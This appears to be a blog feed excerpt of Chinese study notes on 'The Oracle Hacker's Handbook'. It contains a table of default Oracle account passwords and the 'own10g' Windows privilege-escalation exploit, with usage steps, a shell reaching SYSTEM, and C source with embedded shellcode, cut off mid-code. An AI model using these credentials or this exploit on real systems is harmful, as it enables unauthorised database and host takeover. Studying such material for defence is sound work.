/td></tr><tr><td>OPI</td><td>OPI</td></tr><tr><td>ORABAM</td><td>ORABAM</td></tr><tr><td>ORABAMSAMPLES</td><td>ORABAMSAMPLES</td></tr><tr><td>ORABPEL</td><td>ORABPEL</td></tr><tr><td>ORAESB</td><td>ORAESB</td></tr><tr><td>ORAOCA_PUBLIC</td><td>ORAOCA_PUBLIC</td></tr><tr><td>ORASAGENT</td><td>ORASAGENT</td></tr><tr><td>ORASSO</td><td>ORASSO</td></tr><tr><td>ORASSO_DS</td><td>ORASSO_DS</td></tr><tr><td>ORASSO_PA</td><td>ORASSO_PA</td></tr><tr><td>ORASSO_PS</td><td>ORASSO_PS</td></tr><tr><td>ORASSO_PUBLIC</td><td>ORASSO_PUBLIC</td></tr><tr><td>ORDPLUGINS</td><td>ORDPLUGINS</td></tr><tr><td>ORDSYS</td><td>ORDSYS</td></tr><tr><td>OSM</td><td>OSM</td></tr><tr><td>OTA</td><td>OTA</td></tr><tr><td>OUTLN</td><td>OUTLN</td></tr><tr><td>OWAPUB</td><td>OWAPUB</td></tr><tr><td>OWF_MGR</td><td>OWF_MGR</td></tr><tr><td>OZF</td><td>OZF</td></tr><tr><td>OZP</td><td>OZP</td></tr><tr><td>OZS</td><td>OZS</td></tr><tr><td>PA</td><td>PA</td></tr><tr><td>PABLO</td><td>PABLO</td></tr><tr><td>PAIGE</td><td>PAIGE</td></tr><tr><td>PAM</td><td>PAM</td></tr><tr><td>PARRISH</td><td>PARRISH</td></tr><tr><td>PARSON</td><td>PARSON</td></tr><tr><td>PAT</td><td>PAT</td></tr><tr><td>PATORILY</td><td>PATORILY</td></tr><tr><td>PATRICKSANCHEZ</td><td>PATRICKSANCHEZ</td></tr><tr><td>PATSY</td><td>PATSY</td></tr><tr><td>PAUL</td><td>PAUL</td></tr><tr><td>PAULA</td><td>PAULA</td></tr><tr><td>PAXTON</td><td>PAXTON</td></tr><tr><td>PCA1</td><td>PCA1</td></tr><tr><td>PCA2</td><td>PCA2</td></tr><tr><td>PCA3</td><td>PCA3</td></tr><tr><td>PCA4</td><td>PCA4</td></tr><tr><td>PCS1</td><td>PCS1</td></tr><tr><td>PCS2</td><td>PCS2</td></tr><tr><td>PCS3</td><td>PCS3</td></tr><tr><td>PCS4</td><td>PCS4</td></tr><tr><td>PD7333</td><td>PD7333</td></tr><tr><td>PD7334</td><td>PD7334</td></tr><tr><td>PD810</td><td>PD810</td></tr><tr><td>PD811</td><td>PD811</td></tr><tr><td>PD812</td><td>PD812</td></tr><tr><td>PD9</td><td>PD9</td></tr><tr><td>PDA1</td><td>PDA1</td></tr><tr><td>PEARL</td><td>PEARL</td></tr><tr><td>PEG</td><td>PEG</td></tr><tr><td>PENNY</td><td>PENNY</td></tr><tr><td>PERCY</td><td>PERCY</td></tr><tr><td>PERRY</td><td>PERRY</td></tr><tr><td>PETE</td><td>PETE</td></tr><tr><td>PEYTON</td><td>PEYTON</td></tr><tr><td>PHIL</td><td>PHIL</td></tr><tr><td>PJI</td><td>PJI</td></tr><tr><td>PJM</td><td>PJM</td></tr><tr><td>PMI</td><td>PMI</td></tr><tr><td>PN</td><td>PN</td></tr><tr><td>PO</td><td>PO</td></tr><tr><td>POA</td><td>POA</td></tr><tr><td>POLLY</td><td>POLLY</td></tr><tr><td>POM</td><td>POM</td></tr><tr><td>PON</td><td>PON</td></tr><tr><td>PORTAL</td><td>PORTAL</td></tr><tr><td>PORTAL_APP</td><td>PORTAL_APP</td></tr><tr><td>PORTAL_DEMO</td><td>PORTAL_DEMO</td></tr><tr><td>PORTAL_PUBLIC</td><td>PORTAL_PUBLIC</td></tr><tr><td>PORTAL30</td><td>PORTAL30</td></tr><tr><td>PORTAL30_DEMO</td><td>PORTAL30_DEMO</td></tr><tr><td>PORTAL30_PUBLIC</td><td>PORTAL30_PUBLIC</td></tr><tr><td>PORTAL30_SSO</td><td>PORTAL30_SSO</td></tr><tr><td>PORTAL30_SSO_PS</td><td>PORTAL30_SSO_PS</td></tr><tr><td>PORTAL30_SSO_PUBLIC</td><td>PORTAL30_SSO_PUBLIC</td></tr><tr><td>POS</td><td>POS</td></tr><tr><td>PPM1</td><td>PPM1</td></tr><tr><td>PPM2</td><td>PPM2</td></tr><tr><td>PPM3</td><td>PPM3</td></tr><tr><td>PPM4</td><td>PPM4</td></tr><tr><td>PPM5</td><td>PPM5</td></tr><tr><td>PRISTB733</td><td>PRISTB733</td></tr><tr><td>PRISTCTL</td><td>PRISTCTL</td></tr><tr><td>PRISTDTA</td><td>PRISTDTA</td></tr><tr><td>PRODB733</td><td>PRODB733</td></tr><tr><td>PRODCTL</td><td>PRODCTL</td></tr><tr><td>PRODDTA</td><td>PRODDTA</td></tr><tr><td>PRODUSER</td><td>PRODUSER</td></tr><tr><td>PROJMFG</td><td>WELCOME</td></tr><tr><td>PRP</td><td>PRP</td></tr><tr><td>PS</td><td>PS</td></tr><tr><td>PS810</td><td>PS810</td></tr><tr><td>PS810CTL</td><td>PS810CTL</td></tr><tr><td>PS810DTA</td><td>PS810DTA</td></tr><tr><td>PS811</td><td>PS811</td></tr><tr><td>PS811CTL</td><td>PS811CTL</td></tr><tr><td>PS811DTA</td><td>PS811DTA</td></tr><tr><td>PS812</td><td>PS812</td></tr><tr><td>PS812CTL</td><td>PS812CTL</td></tr><tr><td>PS812DTA</td><td>PS812DTA</td></tr><tr><td>PSA</td><td>PSA</td></tr><tr><td>PSB</td><td>PSB</td></tr><tr><td>PSBASS</td><td>PSBASS</td></tr><tr><td>PSEM</td><td>PSEM</td></tr><tr><td>PSFT</td><td>PSFT</td></tr><tr><td>PSFTDBA</td><td>PSFTDBA</td></tr><tr><td>PSP</td><td>PSP</td></tr><tr><td>PTADMIN</td><td>PTADMIN</td></tr><tr><td>PTCNE</td><td>PTCNE</td></tr><tr><td>PTDMO</td><td>PTDMO</td></tr><tr><td>PTE</td><td>PTE</td></tr><tr><td>PTESP</td><td>PTESP</td></tr><tr><td>PTFRA</td><td>PTFRA</td></tr><tr><td>PTG</td><td>PTG</td></tr><tr><td>PTGER</td><td>PTGER</td></tr><tr><td>PTJPN</td><td>PTJPN</td></tr><tr><td>PTUKE</td><td>PTUKE</td></tr><tr><td>PTUPG</td><td>PTUPG</td></tr><tr><td>PTWEB</td><td>PTWEB</td></tr><tr><td>PTWEBSERVER</td><td>PTWEBSERVER</td></tr><tr><td>PV</td><td>PV</td></tr><tr><td>PY7333</td><td>PY7333</td></tr><tr><td>PY7334</td><td>PY7334</td></tr><tr><td>PY810</td><td>PY810</td></tr><tr><td>PY811</td><td>PY811</td></tr><tr><td>PY812</td><td>PY812</td></tr><tr><td>PY9</td><td>PY9</td></tr><tr><td>QA</td><td>QA</td></tr><tr><td>QOT</td><td>QOT</td></tr><tr><td>QP</td><td>QP</td></tr><tr><td>QRM</td><td>QRM</td></tr><tr><td>QS</td><td>QS</td></tr><tr><td>QS_ADM</td><td>QS_ADM</td></tr><tr><td>QS_CB</td><td>QS_CB</td></tr><tr><td>QS_CBADM</td><td>QS_CBADM</td></tr><tr><td>QS_CS</td><td>QS_CS</td></tr><tr><td>QS_ES</td><td>QS_ES</td></tr><tr><td>QS_OS</td><td>QS_OS</td></tr><tr><td>QS_WS</td><td>QS_WS</td></tr><tr><td>RENE</td><td>RENE</td></tr><tr><td>REPADMIN</td><td>REPADMIN</td></tr><tr><td>REPORTS</td><td>REPORTS</td></tr><tr><td>REPORTS_USER</td><td>OEM_TEMP</td></tr><tr><td>RESTRICTED_US</td><td>RESTRICTED_US</td></tr><tr><td>RG</td><td>RG</td></tr><tr><td>RHX</td><td>RHX</td></tr><tr><td>RLA</td><td>RLA</td></tr><tr><td>RLM</td><td>RLM</td></tr><tr><td>RM1</td><td>RM1</td></tr><tr><td>RM2</td><td>RM2</td></tr><tr><td>RM3</td><td>RM3</td></tr><tr><td>RM4</td><td>RM4</td></tr><tr><td>RM5</td><td>RM5</td></tr><tr><td>RMAN</td><td>RMAN</td></tr><tr><td>ROB</td><td>ROB</td></tr><tr><td>RPARKER</td><td>RPARKER</td></tr><tr><td>RWA1</td><td>RWA1</td></tr><tr><td>SALLYH</td><td>SALLYH</td></tr><tr><td>SAM</td><td>SAM</td></tr><tr><td>SARAHMANDY</td><td>SARAHMANDY</td></tr><tr><td>SCM1</td><td>SCM1</td></tr><tr><td>SCM2</td><td>SCM2</td></tr><tr><td>SCM3</td><td>SCM3</td></tr><tr><td>SCM4</td><td>SCM4</td></tr><tr><td>SCOTT</td><td>TIGER</td></tr><tr><td>SDAVIS</td><td>SDAVIS</td></tr><tr><td>SECDEMO</td><td>SECDEMO</td></tr><tr><td>SEDWARDS</td><td>SEDWARDS</td></tr><tr><td>SELLCM</td><td>SELLCM</td></tr><tr><td>SELLER</td><td>SELLER</td></tr><tr><td>SELLTREAS</td><td>SELLTREAS</td></tr><tr><td>SERVICES</td><td>WELCOME</td></tr><tr><td>SETUP</td><td>SETUP</td></tr><tr><td>SH</td><td>SH</td></tr><tr><td>SI_INFORMTN_SCHEMA</td><td>SI_INFORMTN_SCHEMA</td></tr><tr><td>SID</td><td>SID</td></tr><tr><td>SKAYE</td><td>SKAYE</td></tr><tr><td>SKYTETSUKA</td><td>SKYTETSUKA</td></tr><tr><td>SLSAA</td><td>SLSAA</td></tr><tr><td>SLSMGR</td><td>SLSMGR</td></tr><tr><td>SLSREP</td><td>SLSREP</td></tr><tr><td>SRABBITT</td><td>SRABBITT</td></tr><tr><td>SRALPHS</td><td>SRALPHS</td></tr><tr><td>SRAY</td><td>SRAY</td></tr><tr><td>SRIVERS</td><td>SRIVERS</td></tr><tr><td>SSA1</td><td>SSA1</td></tr><tr><td>SSA2</td><td>SSA2</td></tr><tr><td>SSA3</td><td>SSA3</td></tr><tr><td>SSC1</td><td>SSC1</td></tr><tr><td>SSC2</td><td>SSC2</td></tr><tr><td>SSC3</td><td>SSC3</td></tr><tr><td>SSOSDK</td><td>SSOSDK</td></tr><tr><td>SSP</td><td>SSP</td></tr><tr><td>SSS1</td><td>SSS1</td></tr><tr><td>SUPPLIER</td><td>SUPPLIER</td></tr><tr><td>SVM7333</td><td>SVM7333</td></tr><tr><td>SVM7334</td><td>SVM7334</td></tr><tr><td>SVM810</td><td>SVM810</td></tr><tr><td>SVM811</td><td>SVM811</td></tr><tr><td>SVM812</td><td>SVM812</td></tr><tr><td>SVM9</td><td>SVM9</td></tr><tr><td>SVMB733</td><td>SVMB733</td></tr><tr><td>SVP1</td><td>SVP1</td></tr><tr><td>SY810</td><td>SY810</td></tr><tr><td>SY811</td><td>SY811</td></tr><tr><td>SY812</td><td>SY812</td></tr><tr><td>SY9</td><td>SY9</td></tr><tr><td>SYS</td><td>MANAGER</td></tr><tr><td>SYS</td><td>CHANGE_ON_INSTALL</td></tr><tr><td>SYS7333</td><td>SYS7333</td></tr><tr><td>SYS7334</td><td>SYS7334</td></tr><tr><td>SYSADMIN</td><td>SYSADMIN</td></tr><tr><td>SYSB733</td><td>SYSB733</td></tr><tr><td>SYSTEM</td><td>MANAGER</td></tr><tr><td>TDEMARCO</td><td>TDEMARCO</td></tr><tr><td>TDOS_ICSAP</td><td>TDOS_ICSAP</td></tr><tr><td>TESTCTL</td><td>TESTCTL</td></tr><tr><td>TESTDTA</td><td>TESTDTA</td></tr><tr><td>TRA1</td><td>TRA1</td></tr><tr><td>TRACESVR</td><td>TRACE</td></tr><tr><td>TRBM1</td><td>TRBM1</td></tr><tr><td>TRCM1</td><td>TRCM1</td></tr><tr><td>TRDM1</td><td>TRDM1</td></tr><tr><td>TRRM1</td><td>TRRM1</td></tr><tr><td>TWILLIAMS</td><td>TWILLIAMS</td></tr><tr><td>UDDISYS</td><td>UDDISYS</td></tr><tr><td>VEA</td><td>VEA</td></tr><tr><td>VEH</td><td>VEH</td></tr><tr><td>VIDEO31</td><td>VIDEO31</td></tr><tr><td>VIDEO4</td><td>VIDEO4</td></tr><tr><td>VIDEO5</td><td>VIDEO5</td></tr><tr><td>VP1</td><td>VP1</td></tr><tr><td>VP2</td><td>VP2</td></tr><tr><td>VP3</td><td>VP3</td></tr><tr><td>VP4</td><td>VP4</td></tr><tr><td>VP5</td><td>VP5</td></tr><tr><td>VP6</td><td>VP6</td></tr><tr><td>WAA1</td><td>WAA1</td></tr><tr><td>WAA2</td><td>WAA2</td></tr><tr><td>WCRSYS</td><td>WCRSYS</td></tr><tr><td>WEBDB</td><td>WEBDB</td></tr><tr><td>WEBSYS</td><td>WELCOME</td></tr><tr><td>WENDYCHO</td><td>WENDYCHO</td></tr><tr><td>WH</td><td>WH</td></tr><tr><td>WIP</td><td>WIP</td></tr><tr><td>WIRELESS</td><td>WELCOME</td></tr><tr><td>WIRELESS</td><td>WIRELESS</td></tr><tr><td>WK_TEST</td><td>WK_TEST</td></tr><tr><td>WKPROXY</td><td>WKPROXY</td></tr><tr><td>WKSYS</td><td>WKSYS</td></tr><tr><td>WMS</td><td>WMS</td></tr><tr><td>WMSYS</td><td>WMSYS</td></tr><tr><td>WPS</td><td>WPS</td></tr><tr><td>WSH</td><td>WSH</td></tr><tr><td>WSM</td><td>WSM</td></tr><tr><td>XDB</td><td>CHANGE_ON_INSTALL</td></tr><tr><td>XDO</td><td>XDO</td></tr><tr><td>XDP</td><td>XDP</td></tr><tr><td>XLA</td><td>XLA</td></tr><tr><td>XLE</td><td>XLE</td></tr><tr><td>XNB</td><td>XNB</td></tr><tr><td>XNC</td><td>XNC</td></tr><tr><td>XNI</td><td>XNI</td></tr><tr><td>XNM</td><td>XNM</td></tr><tr><td>XNP</td><td>XNP</td></tr><tr><td>XNS</td><td>XNS</td></tr><tr><td>XTR</td><td>XTR</td></tr><tr><td>YCAMPOS</td><td>YCAMPOS</td></tr><tr><td>YSANCHEZ</td><td>YSANCHEZ</td></tr><tr><td>ZFA</td><td>ZFA</td></tr><tr><td>ZPB</td><td>ZPB</td></tr><tr><td>ZSA</td><td>ZSA</td></tr></tbody></table><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote><ul><li>The Oracle Hacker’s Handbook: Hacking  and Defending Oracle</li></ul></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;The  Oracle Hacker’s Handbook: Hacking and Defending Oracle&lt;/strong&gt; &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;by David  Litchfield John Wiley &amp;amp; Sons&lt;/</summary>
      
    
    
    
    <category term="2. 数据库安全" scheme="http://example.com/categories/2-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/"/>
    
    <category term="Oracle Database" scheme="http://example.com/categories/2-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle-Database/"/>
    
    
    <category term="Oracle Database" scheme="http://example.com/tags/Oracle-Database/"/>
    
  </entry>
  
  <entry>
    <title>The Oracle Hacker&#39;s Handbook: Hacking and Defending Oracle 上篇</title>
    <link href="http://example.com/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/The-Oracle-Hacker-s-Handbook-Hacking-and-Defending-Oracle-%E4%B8%8A%E7%AF%87/"/>
    <id>http://example.com/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/The-Oracle-Hacker-s-Handbook-Hacking-and-Defending-Oracle-%E4%B8%8A%E7%AF%87/</id>
    <published>2021-07-12T08:06:40.000Z</published>
    <updated>2021-07-14T08:17:18.558Z</updated>
    
    <content type="html"><![CDATA[<p><strong>The  Oracle Hacker’s Handbook: Hacking and Defending Oracle</strong></p><p><strong>by David  Litchfield John Wiley &amp; Sons</strong></p><p>探索黑帽黑客用来入侵和破坏 Oracle 的每一种技术和工具，这份深入指南向您展示了如何找到数据库中的弱点，以便更好地保护它们。</p><p>[TOC]</p><h2 id="Oracle-RDBMS概述"><a href="#Oracle-RDBMS概述" class="headerlink" title="Oracle RDBMS概述"></a>Oracle RDBMS概述</h2><h3 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h3><p>​        在Windows上还是在Linux平台上,构成Oracle服务器和服务的过程会有所不同。</p><p>​        数据库实例描述了提供对数据库访问权限的所有进程和内存结构。有两种后台进程，shadow或服务器。shadow或服务器进程服务于客户端请求。换句话说，当客户端连接到TNS侦听器并请求访问数据库服务时，TNS侦听器会将它们移交给服务器进程。该服务器进程接受SQL查询，并代表客户端执行它们。存在后台进程来支持这一点。有许多不同的后台进程，每个进程都有不同的角色，包括数据库编写器，日志编写器，存档器，系统监视器和进程监视器等。</p><p>​        在Linux平台上，这些后台进程中的每个进程都是独立的运行进程，就像在操作系统进程中一样。在Windows上，它们全部打包为一个更大的进程oracle.exe。在Linux的所有进程之间都有一个特殊的内存区域，称为系统全局区域（SGA）。 SGA被实现为内存映射文件（部分），并包含与实例和数据库有关的信息。它还包含一个称为共享池的区域，该区域包含所有用户之间共享的结构，例如表定义等。</p><p>​        在Windows上运行的Oracle流程的一个有趣的方面是，该流程可以由“Everyone”组以编程方式打开。以下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">1）获取Oracle.exe的进程ID-例如 1892</span><br><span class="line">2）获取数据库SID-例如 ORCL</span><br><span class="line">3）打开2个shell-我们称它们为A和B</span><br><span class="line">4）在命令shell中运行</span><br><span class="line">  C:\&gt;sqlplus /nolog</span><br><span class="line">      SQL*Plus: Release 10.1.0.2.0 - Production on Fri Jun 3 23:18:58</span><br><span class="line">2005</span><br><span class="line">      Copyright (c) 1982, 2004, Oracle. All rights reserved.</span><br><span class="line">      SQL&gt; connect scott/invalidpassword</span><br><span class="line">5）在命令shell B中运行</span><br><span class="line">       C：\&gt; own10g 1892 * oraspawn_buffer_orcl *</span><br><span class="line">6）在命令Shell A中尝试在sqlplus中重新进行身份验证</span><br><span class="line">7）在命令shell B中运行</span><br><span class="line">       C：\&gt; telnet 127.0.0.1 6666</span><br><span class="line">       Microsoft Windows XP [版本5.1.2600]</span><br><span class="line">      Microsoft Windows XP [Version 5.1.2600]</span><br><span class="line">     C:\WINDOWS\system32&gt;c:\whoami</span><br><span class="line">      c:\whoami</span><br><span class="line">      NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;winbase.h&gt;</span><br><span class="line"></span><br><span class="line">HANDLE hSection=NULL;</span><br><span class="line">unsigned char *p = NULL;</span><br><span class="line"></span><br><span class="line">int OpenTheSection(unsigned char *section, DWORD perm);</span><br><span class="line">SIZE_T GetSizeOfSection();</span><br><span class="line">int MapTheSection(unsigned int rw);</span><br><span class="line"></span><br><span class="line">unsigned char shellcode[]=</span><br><span class="line">&quot;\x83\xEC\x24\x55\x8B\xEC\xEB\x03\x58\xEB\x05\xE8\xF8\xFF\xFF\xFF&quot;</span><br><span class="line">&quot;\x83\xC0\x7E\x83\xC0\x7B\x50\x99\x64\x8B\x42\x30\x8B\x40\x0C\x8B&quot;</span><br><span class="line">&quot;\x70\x1C\xAD\x8B\x48\x08\x51\x52\x8B\x7D\xFC\x8B\x3C\x57\x57\x8B&quot;</span><br><span class="line">&quot;\x41\x3C\x8B\x7C\x01\x78\x03\xF9\x8B\x5F\x1C\x8B\x77\x20\x8B\x7F&quot;</span><br><span class="line">&quot;\x24\x03\xF1\x03\xD9\x03\xF9\xAD\x91\x33\xF6\x33\xD2\x8A\x14\x08&quot;</span><br><span class="line">&quot;\x41\xC1\xCE\x0D\x03\xF2\x84\xD2\x75\xF3\x83\xC7\x02\x5A\x52\x66&quot;</span><br><span class="line">&quot;\x3B\xF2\x75\xE5\x5A\x5A\x42\x0F\xB7\x4F\xFE\x03\x04\x8B\x89\x44&quot;</span><br><span class="line">&quot;\x95\x04\x59\x80\xFA\x02\x7E\xAE\x80\xFA\x08\x74\x1E\x52\x80\xFA&quot;</span><br><span class="line">&quot;\x03\x74\x02\xEB\xA1\x99\x52\x68\x33\x32\x20\x20\x68\x77\x73\x32&quot;</span><br><span class="line">&quot;\x5F\x54\xFF\xD0\x83\xC4\x0C\x5A\x91\xEB\x8B\x99\xB6\x02\x2B\xE2&quot;</span><br><span class="line">&quot;\x54\x83\xC2\x02\x52\xFF\xD0\x50\x50\x50\x6A\x06\x6A\x01\x6A\x02&quot;</span><br><span class="line">&quot;\xFF\x55\x14\x8D\x65\xD4\x50\x99\x52\x52\x52\xBA\x02\xFF\x1A\x0A&quot;</span><br><span class="line">&quot;\xFE\xC6\x52\x54\x5F\x6A\x10\x57\x50\xFF\x55\x18\x6A\x01\xFF\x75&quot;</span><br><span class="line"></span><br><span class="line">&quot;\xD0\xFF\x55\x1C\x50\x50\xFF\x75\xD0\xFF\x55\x20\x99\x52\x68\x63&quot;</span><br><span class="line">&quot;\x6D\x64\x20\x54\x5F\x50\x50\x50\x52\x52\xB6\x01\x52\x6A\x0A\x99&quot;</span><br><span class="line">&quot;\x59\x52\xE2\xFD\x6A\x44\x54\x5E\x42\x54\x56\x51\x51\x51\x52\x51&quot;</span><br><span class="line">&quot;\x51\x57\x51\xFF\x55\x0C\xFF\x55\x08\x16\x9F\x9F\xB5\x72\x60\xA8&quot;</span><br><span class="line">&quot;\x6F\x80\x3B\x75\x49\x32\x4C\xE7\xDF&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int WriteShellCode(char *section);</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">      HANDLE hThread = NULL;</span><br><span class="line">      DWORD id = 0;</span><br><span class="line">      HMODULE k=NULL;</span><br><span class="line">      FARPROC mOpenThread = 0;</span><br><span class="line">      FARPROC ntq = 0;</span><br><span class="line">      FARPROC nts = 0;</span><br><span class="line">      unsigned char buff[1024]=&quot;&quot;;</span><br><span class="line">      unsigned int len = 0;</span><br><span class="line">      unsigned int res = 0;</span><br><span class="line">      unsigned int pid = 0;</span><br><span class="line">      unsigned char *p = 0;</span><br><span class="line">      unsigned int tid = 0;</span><br><span class="line">      CONTEXT ctx;</span><br><span class="line">      unsigned char *ptr=NULL;</span><br><span class="line"></span><br><span class="line">      if(argc != 3)</span><br><span class="line">      &#123;</span><br><span class="line">            printf(&quot;\n\n\t*** own10g ***\n\n&quot;);</span><br><span class="line">            printf(&quot;\tC:\\&gt;%s pid section_name\n\n&quot;,argv[0]);</span><br><span class="line">            printf(&quot;\twhere pid is the process ID of Oracle\n&quot;);</span><br><span class="line">            printf(&quot;\tand section_name is *oraspawn_buffer_SID*\n&quot;);</span><br><span class="line">            printf(&quot;\tSID is the database SID - e.g. orcl\n\n&quot;);</span><br><span class="line">            printf(&quot;\tSee notes in source code for full details\n\n&quot;);</span><br><span class="line">            printf(&quot;\tDavid Litchfield\n\t(davidl@ngssoftware.com)&quot;);</span><br><span class="line">printf(&quot;\n\t3rd June 2005\n\n\n&quot;);</span><br><span class="line">            return 0;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      if(WriteShellCode(argv[2])==0)</span><br><span class="line">            return printf(&quot;Failed to write to section %s\n&quot;,argv[2]);</span><br><span class="line"></span><br><span class="line">      k = LoadLibrary(&quot;kernel32.dll&quot;);</span><br><span class="line">      if(!k)</span><br><span class="line">            return printf(&quot;Failed to load kernel32.dll&quot;);</span><br><span class="line">      mOpenThread = GetProcAddress(k,&quot; OpenThread&quot;);</span><br><span class="line">      if(!mOpenThread)</span><br><span class="line">            return printf(&quot;Failed to get address of OpenThread!&quot;);</span><br><span class="line">      k = LoadLibrary(&quot;ntdll.dll&quot;);</span><br><span class="line"></span><br><span class="line">      if(!k)</span><br><span class="line">            return printf(&quot;Failed to load ntdll.dll&quot;);</span><br><span class="line">      ntq = GetProcAddress(k,&quot; NtQueryInformationThread&quot;);</span><br><span class="line">      if(!ntq)</span><br><span class="line">            return printf(&quot;Failed&quot;);</span><br><span class="line">      nts = GetProcAddress(k,&quot; NtSetInformationThread&quot;);</span><br><span class="line">      if(!nts)</span><br><span class="line">            return printf(&quot;Failed&quot;);</span><br><span class="line"></span><br><span class="line">      tid = atoi(argv[1]);</span><br><span class="line"></span><br><span class="line">      while(id &lt; 0xFFFF)</span><br><span class="line">      &#123;</span><br><span class="line">            hThread = mOpenThread(THREAD_ALL_ACCESS,TRUE,id);</span><br><span class="line">            if(hThread)</span><br><span class="line">            &#123;</span><br><span class="line">                  res = ntq(hThread,0,buff,0x1C,&amp;len);</span><br><span class="line">                  if(res 